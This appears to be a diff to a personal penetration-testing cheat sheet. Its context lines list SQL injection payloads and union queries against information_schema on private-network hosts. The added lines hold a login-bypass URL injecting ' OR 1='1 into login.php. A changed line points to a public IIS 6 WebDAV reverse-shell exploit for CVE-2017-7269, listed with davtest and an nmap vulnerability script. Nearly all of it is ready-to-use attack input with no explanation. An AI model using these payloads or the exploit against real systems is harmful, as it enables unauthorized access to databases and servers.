@@ -539,6 +539,12 @@ or 1=1 --
 ") or ("x"="x	      
 ' or username LIKE '%admin% 
 
+POST Method -->
+
+
+Get Method --> via the url
+http://172.20.29.77/login.php?username=tom' OR 1='1 & passwd=tom ' or 1='1
+
  http://172.20.22.134/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns 
     union select table_schema,column_name,table_name from information_schema.columns 
 
@@ -591,7 +597,7 @@ Microsoft IIs version
 5.1	Built-in component of Windows XP Professional.	Windows XP Professional
 6.0	Built-in component of Windows Server 2003.	WIndows Server 2003
                CVE-2017-7269
-                  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
+                     https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6 reverse shell
                webdav
                   davtest -url <URL>
                   /usr/share/nmap/scripts/http-iis-webdav-vuln.nse                                                                                                                       
